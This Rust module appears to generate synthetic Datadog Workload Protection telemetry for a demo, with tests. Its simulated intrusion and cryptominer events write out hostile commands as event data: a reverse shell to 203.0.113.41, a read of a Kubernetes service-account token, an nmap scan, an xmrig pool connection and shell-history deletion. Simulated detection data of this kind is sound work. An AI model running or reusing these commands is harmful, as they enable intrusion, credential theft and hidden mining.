//! Workload Protection demo data, as the Datadog Agent sends it: host metadata and inventory (which
//! hosts run the runtime security module), the events its probes count
//! (`datadog.runtime_security.perf_buffer.events.write` by `event_type`), and the events that
//! matched an agent rule, on the runtime security track (`/api/v2/secruntime`, a logs payload whose
//! message is the event as JSON).
//!
//! Routine matches (sudo, root processes in containers, IMDSv1 from one host) come every few
//! seconds; now and then a shell or a package manager runs in a storefront container; every 45
//! minutes an intrusion plays out on one container (web shell, shell, token read, scanner, reverse
//! shell). Hosts are the demo's `i-0a1b2c3d4e5f6000N`, three Fargate tasks run on account
//! 123456789012.

use serde_json::{json, Value};

use crate::hosts::HOSTS;
use crate::Rng;

const AGENT_VERSION: &str = "7.70.2";
const SOURCE: &str = "runtime-security-agent";

/// Fargate tasks with the Agent as a sidecar: (task id, cluster, service, Workload Protection on).
const TASKS: [(&str, &str, &str, bool); 3] = [
    ("4f6c1e0a9b2d4c7e8a1f3b5d7c9e0a12", "shop-prod-ecs", "billing", true),
    ("7a2b9c4d1e6f4a3b8c5d2e7f9a0b1c34", "shop-prod-ecs", "billing", false),
    ("9d8c7b6a5f4e4d3c2b1a0f9e8d7c6b56", "shop-prod-ecs", "notification-service", false),
];

/// Containers per Kubernetes host: (container name, image, service).
const CONTAINERS: [(&str, &str, &str); 5] = [
    ("storefront-api-7d9f6c5b8-x2kq4", "storefront-api", "storefront-api"),
    ("order-service-5c8d7f9b6-m4pz7", "order-service", "order-service"),
    ("catalog-service-6b7c8d9e5-q8wl2", "catalog-service", "catalog-service"),
    ("checkout-6f5e4d3c2-v7rn9", "checkout", "checkout"),
    ("api-gateway-8a9b7c6d5-k3jt6", "api-gateway", "api-gateway"),
];

fn pick<'a, T>(rng: &mut Rng, items: &'a [T]) -> &'a T {
    &items[rng.range(0, items.len() as u64) as usize]
}

/// Whether the host runs Workload Protection (all but the staging node).
fn cws_on(i: usize) -> bool {
    HOSTS[i].env != "staging"
}

/// The `/intake/` host metadata of each Agent (hosts, then Fargate tasks).
pub fn host_metadata() -> Vec<Value> {
    let mut out: Vec<Value> = HOSTS
        .iter()
        .map(|h| {
            let mut tags = vec![format!("env:{}", h.env)];
            if let Some(c) = h.cluster {
                tags.push(format!("kube_cluster_name:{c}"));
            }
            json!({
                "agentVersion": AGENT_VERSION, "internalHostname": h.name, "os": "linux",
                "systemStats": { "cpuCores": 4, "machine": "amd64", "platform": "linux", "nixV": ["ubuntu", "24.04", ""] },
                "meta": { "hostname": h.name, "instance-id": h.name },
                "host-tags": { "system": tags },
                "install-method": { "tool": if h.cluster.is_some() { "helm" } else { "install_script" }, "tool_version": "", "installer_version": if h.cluster.is_some() { "datadog-3.120.0" } else { "install_script-1.40.0" } },
            })
        })
        .collect();
    for (task, cluster, service, _) in TASKS {
        out.push(json!({
            "agentVersion": AGENT_VERSION, "internalHostname": format!("fargate-{}", &task[..12]), "os": "linux",
            "systemStats": { "cpuCores": 1, "machine": "amd64", "platform": "linux", "nixV": [] },
            "meta": { "hostname": format!("fargate-{}", &task[..12]) },
            "host-tags": { "system": [format!("env:prod"), format!("ecs_cluster_name:{cluster}"), format!("service:{service}")] },
        }));
    }
    out
}

/// The `/api/v1/metadata` Agent inventories (features), matching [`host_metadata`].
pub fn inventories() -> Vec<Value> {
    let mut out: Vec<Value> = HOSTS
        .iter()
        .enumerate()
        .map(|(i, h)| {
            json!({ "hostname": h.name, "agent_metadata": {
                "agent_version": AGENT_VERSION,
                "feature_cws_enabled": cws_on(i),
                "feature_cspm_enabled": h.cluster.is_some(),
                "feature_csm_vm_hosts_enabled": i % 2 == 0,
                "feature_csm_vm_containers_enabled": h.cluster.is_some(),
                "feature_remote_configuration_enabled": true,
                "feature_cws_remote_config_enabled": false,
                "install_method_tool": if h.cluster.is_some() { "helm" } else { "install_script" },
            }})
        })
        .collect();
    for (task, cluster, _, on) in TASKS {
        out.push(json!({ "hostname": format!("fargate-{}", &task[..12]), "agent_metadata": {
            "agent_version": AGENT_VERSION,
            "feature_cws_enabled": on,
            "ecs_fargate_task_arn": format!("arn:aws:ecs:eu-central-1:123456789012:task/{cluster}/{task}"),
            "ecs_fargate_cluster_name": cluster,
            "install_method_tool": "ecs_task_definition",
        }}));
    }
    out
}

/// Probe counts per host and event type over the last `secs` (`/api/v2/series` JSON, count type).
pub fn monitored_series(rng: &mut Rng, now_s: u64, secs: f64) -> Value {
    // Events per second on a busy node.
    const RATES: [(&str, f64); 10] = [("open", 900.0), ("exec", 14.0), ("fork", 22.0), ("exit", 20.0), ("chmod", 1.5), ("unlink", 6.0), ("rename", 3.0), ("dns", 40.0), ("bind", 0.6), ("load_module", 0.01)];
    let mut series = Vec::new();
    for (i, h) in HOSTS.iter().enumerate().filter(|(i, _)| cws_on(*i)) {
        let load = 0.6 + 0.2 * i as f64;
        for (event_type, rate) in RATES {
            let v = (rate * load * secs * (0.8 + 0.4 * rng.f())).round();
            series.push(json!({
                "metric": "datadog.runtime_security.perf_buffer.events.write", "type": 1, "interval": secs as i64,
                "points": [{ "timestamp": now_s, "value": v }], "resources": [{ "name": h.name, "type": "host" }],
                "tags": [format!("event_type:{event_type}"), "map:events".to_string(), format!("env:{}", h.env)],
            }));
        }
    }
    json!({ "series": series })
}

struct Ctx {
    host: &'static str,
    env: &'static str,
    container: Option<(&'static str, &'static str, &'static str)>,
}

fn kube_hosts() -> Vec<usize> {
    HOSTS.iter().enumerate().filter(|(i, h)| h.cluster.is_some() && cws_on(*i)).map(|(i, _)| i).collect()
}

fn ctx_on(rng: &mut Rng, container: bool) -> Ctx {
    if container {
        let i = *pick(rng, &kube_hosts());
        Ctx { host: HOSTS[i].name, env: HOSTS[i].env, container: Some(*pick(rng, &CONTAINERS)) }
    } else {
        let all: Vec<usize> = (0..HOSTS.len()).filter(|i| cws_on(*i)).collect();
        let i = *pick(rng, &all);
        Ctx { host: HOSTS[i].name, env: HOSTS[i].env, container: None }
    }
}

fn container_id(name: &str) -> String {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in name.bytes() {
        h ^= u64::from(b);
        h = h.wrapping_mul(0x0100_0000_01b3);
    }
    format!("{h:016x}{:016x}{:016x}{:016x}", h.rotate_left(17), h.rotate_left(31), h.rotate_left(47))
}

/// One matched event: the logs payload entry with the event JSON as its message.
#[allow(clippy::too_many_arguments)]
fn event(ts_ms: i64, c: &Ctx, rule: &str, title: &str, name: &str, category: &str, process: Value, extra: Value) -> Value {
    let mut e = json!({
        "agent": { "rule_id": rule, "policy_name": "threat-detection", "version": AGENT_VERSION, "os": "linux", "arch": "x86_64", "origin": "ebpf" },
        "title": title,
        "evt": { "name": name, "category": category, "outcome": "Success" },
        "date": chrono_like(ts_ms),
        "process": process,
        "hostname": c.host,
    });
    if let (Some(o), Some(x)) = (e.as_object_mut(), extra.as_object()) {
        for (k, v) in x {
            o.insert(k.clone(), v.clone());
        }
    }
    let mut tags = vec![format!("env:{}", c.env), format!("source:{SOURCE}")];
    let service = match c.container {
        Some((cname, image, service)) => {
            e["container"] = json!({ "id": container_id(cname) });
            tags.extend([format!("container_name:{cname}"), format!("image_name:{image}"), "image_tag:v1.42.0".to_string(), "kube_namespace:shop".to_string(), format!("service:{service}")]);
            service
        }
        None => SOURCE,
    };
    json!({ "ddsource": SOURCE, "service": service, "hostname": c.host, "status": "info", "timestamp": ts_ms, "ddtags": tags.join(","), "message": e.to_string() })
}

fn chrono_like(ts_ms: i64) -> String {
    let secs = ts_ms.div_euclid(1000);
    let (days, rem) = (secs.div_euclid(86_400), secs.rem_euclid(86_400));
    // Civil date from days since the epoch (Howard Hinnant's algorithm).
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = yoe + era * 400 + i64::from(m <= 2);
    format!("{y:04}-{m:02}-{d:02}T{:02}:{:02}:{:02}.{:03}Z", rem / 3600, rem % 3600 / 60, rem % 60, ts_ms.rem_euclid(1000))
}

fn proc(path: &str, args: &[&str], user: &str, parent: &str) -> Value {
    let comm = path.rsplit('/').next().unwrap_or(path);
    json!({ "pid": 4000 + comm.len() as u64 * 37, "comm": comm, "executable": { "path": path, "name": comm }, "file": { "path": path, "name": comm },
        "args": args, "user": user, "uid": if user == "root" { 0 } else { 1000 }, "parent": { "comm": parent, "file": { "name": parent } } })
}

/// The matched events of second `seconds` (epoch ms `now_ms`).
pub fn tick(rng: &mut Rng, now_ms: i64, seconds: u64) -> Vec<Value> {
    let mut out = Vec::new();
    // Routine: sudo on a host, root processes in containers, IMDSv1 from the self-managed host.
    if rng.chance(0.25) {
        let c = ctx_on(rng, false);
        out.push(event(now_ms, &c, "sudo_used", "Command run with sudo", "exec", "Process Activity", proc("/usr/bin/sudo", &["systemctl", "status", "nginx"], "ana.popescu", "bash"), json!({})));
    }
    if rng.chance(0.3) {
        let c = ctx_on(rng, true);
        out.push(event(now_ms, &c, "root_process_in_container", "Process started as root in a container", "exec", "Process Activity", proc("/usr/local/bin/node", &["server.js"], "root", "tini"), json!({})));
    }
    if seconds % 20 == 7 {
        let c = Ctx { host: HOSTS[3].name, env: HOSTS[3].env, container: None };
        out.push(event(now_ms, &c, "imds_v1_request", "Cloud metadata reached without a session token", "imds", "Network Activity", proc("/usr/bin/python3", &["/opt/backup/sync.py"], "backup", "cron"),
            json!({ "imds": { "cloud_provider": "aws", "type": "request", "url": "/latest/meta-data/iam/security-credentials/", "aws": { "is_imds_v2": false } } })));
    }
    // Now and then: drift in the storefront containers.
    if seconds % 120 == 31 {
        let c = Ctx { host: HOSTS[0].name, env: HOSTS[0].env, container: Some(CONTAINERS[0]) };
        out.push(event(now_ms, &c, "shell_in_container", "Interactive shell started in a container", "exec", "Process Activity", proc("/bin/sh", &["-c", "ls /app"], "root", "runc"), json!({})));
    }
    if seconds % 300 == 97 {
        let c = ctx_on(rng, true);
        out.push(event(now_ms, &c, "package_manager_in_container", "Package manager run in a container", "exec", "Process Activity", proc("/usr/bin/apt-get", &["install", "-y", "curl"], "root", "sh"), json!({})));
    }
    if seconds % 900 == 450 {
        let c = Ctx { host: HOSTS[1].name, env: HOSTS[1].env, container: Some(CONTAINERS[2]) };
        out.push(event(now_ms, &c, "compiler_in_container", "Compiler run in a container", "exec", "Process Activity", proc("/usr/bin/gcc", &["-o", "/tmp/x", "/tmp/x.c"], "root", "sh"), json!({})));
    }
    if seconds % 1800 == 600 {
        let c = Ctx { host: HOSTS[4].name, env: HOSTS[4].env, container: None };
        out.push(event(now_ms, &c, "sudoers_modified", "Sudoers policy modified", "open", "File Activity", proc("/usr/bin/vim", &["/etc/sudoers.d/deploy"], "root", "sudo"),
            json!({ "file": { "path": "/etc/sudoers.d/deploy", "name": "deploy", "flags": ["O_WRONLY", "O_CREAT"] } })));
    }
    if seconds % 3600 == 1200 {
        let c = Ctx { host: HOSTS[3].name, env: HOSTS[3].env, container: None };
        out.push(event(now_ms, &c, "user_account_created", "User account created", "exec", "Process Activity", proc("/usr/sbin/useradd", &["-m", "svc-reports"], "root", "bash"), json!({})));
        out.push(event(now_ms + 4000, &c, "package_installed_on_host", "Package installed on a host", "exec", "Process Activity", proc("/usr/bin/apt-get", &["install", "-y", "htop"], "root", "bash"), json!({})));
    }
    // Every 45 minutes: an intrusion through the storefront's web process.
    if seconds % 2700 == 1500 {
        let c = Ctx { host: HOSTS[0].name, env: HOSTS[0].env, container: Some(CONTAINERS[0]) };
        let steps: [(&str, &str, &str, &str, Value, Value); 6] = [
            ("web_server_spawned_shell", "Web server process spawned a shell", "exec", "Process Activity", proc("/bin/sh", &["-c", "id; uname -a"], "node", "node"), json!({})),
            ("shell_in_container", "Interactive shell started in a container", "exec", "Process Activity", proc("/bin/bash", &["-i"], "node", "node"), json!({})),
            ("service_account_token_read", "Kubernetes service account token read", "open", "File Activity", proc("/bin/cat", &["/var/run/secrets/kubernetes.io/serviceaccount/token"], "node", "bash"),
                json!({ "file": { "path": "/var/run/secrets/kubernetes.io/serviceaccount/token", "name": "token" } })),
            ("network_scanner_executed", "Network scanner executed", "exec", "Process Activity", proc("/tmp/nmap", &["-sT", "10.0.0.0/24"], "node", "bash"), json!({})),
            ("downloaded_binary_executed", "Binary executed from a temporary directory", "exec", "Process Activity", proc("/tmp/nmap", &["-sT", "10.0.0.0/24"], "node", "bash"), json!({})),
            ("reverse_shell", "Reverse shell", "exec", "Process Activity", proc("/bin/bash", &["-c", "bash -i >& /dev/tcp/203.0.113.41/4444 0>&1"], "node", "bash"), json!({})),
        ];
        for (i, (rule, title, name, category, p, extra)) in steps.into_iter().enumerate() {
            out.push(event(now_ms + i as i64 * 7000, &c, rule, title, name, category, p, extra));
        }
    }
    // Every hour: a cryptominer on the staging-free self-managed host.
    if seconds % 3600 == 2400 {
        let c = Ctx { host: HOSTS[4].name, env: HOSTS[4].env, container: None };
        out.push(event(now_ms, &c, "cryptominer_executed", "Cryptocurrency miner executed", "exec", "Process Activity", proc("/dev/shm/.x/xmrig", &["-o", "stratum+tcp://pool.example.net:3333"], "www-data", "sh"), json!({})));
        out.push(event(now_ms + 2000, &c, "mining_pool_dns", "Mining pool domain resolved", "dns", "Network Activity", proc("/dev/shm/.x/xmrig", &[], "www-data", "sh"),
            json!({ "dns": { "question": { "name": "xmr-pool.example.net", "type": "A" } } })));
        out.push(event(now_ms + 30_000, &c, "shell_history_cleared", "Shell history deleted", "unlink", "File Activity", proc("/bin/rm", &["-f", "/var/www/.bash_history"], "www-data", "sh"),
            json!({ "file": { "path": "/var/www/.bash_history", "name": ".bash_history" } })));
    }
    out
}

/// Sends `payload` and logs a failure.
pub async fn post(http: &reqwest::Client, url: &str, payload: &Value, what: &str) {
    match http.post(url).json(payload).send().await {
        Ok(r) if r.status().is_success() => {}
        Ok(r) => tracing::warn!(status = %r.status(), "{what} rejected"),
        Err(e) => tracing::warn!(error = %e, "{what} not sent"),
    }
}

/// Host metadata, then inventories (the inventory updates the host's row).
pub async fn send_metadata(http: &reqwest::Client, endpoint: &str) {
    for h in host_metadata() {
        post(http, &format!("{endpoint}/intake/"), &h, "host metadata").await;
    }
    for i in inventories() {
        post(http, &format!("{endpoint}/api/v1/metadata"), &i, "agent inventory").await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn events_are_the_agents_json_in_a_logs_payload() {
        let mut rng = Rng(7);
        let all: Vec<Value> = (0..3600).flat_map(|s| tick(&mut rng, 1_760_000_000_000 + s as i64 * 1000, s)).collect();
        let rules: std::collections::BTreeSet<String> = all
            .iter()
            .map(|l| {
                assert_eq!(l["ddsource"], SOURCE);
                let e: Value = serde_json::from_str(l["message"].as_str().unwrap()).unwrap();
                e["agent"]["rule_id"].as_str().unwrap().to_string()
            })
            .collect();
        for r in ["shell_in_container", "reverse_shell", "imds_v1_request", "sudoers_modified", "cryptominer_executed"] {
            assert!(rules.contains(r), "{r}: {rules:?}");
        }
        let c = all.iter().find(|l| l["ddtags"].as_str().unwrap().contains("image_name:")).unwrap();
        assert!(serde_json::from_str::<Value>(c["message"].as_str().unwrap()).unwrap()["container"]["id"].is_string());
        assert_eq!(chrono_like(0), "1970-01-01T00:00:00.000Z");
        assert_eq!(chrono_like(1_761_955_200_123), "2025-11-01T00:00:00.123Z");
    }

    #[test]
    fn inventories_match_the_host_metadata() {
        let hosts: Vec<String> = host_metadata().iter().map(|h| h["internalHostname"].as_str().unwrap().to_string()).collect();
        let inv: Vec<String> = inventories().iter().map(|h| h["hostname"].as_str().unwrap().to_string()).collect();
        assert_eq!(hosts, inv);
        assert!(inventories().iter().any(|i| i["agent_metadata"]["ecs_fargate_task_arn"].as_str().is_some_and(|a| a.contains("123456789012"))));
        assert!(monitored_series(&mut Rng(3), 1_760_000_000, 10.0)["series"].as_array().unwrap().len() > 10);
    }
}
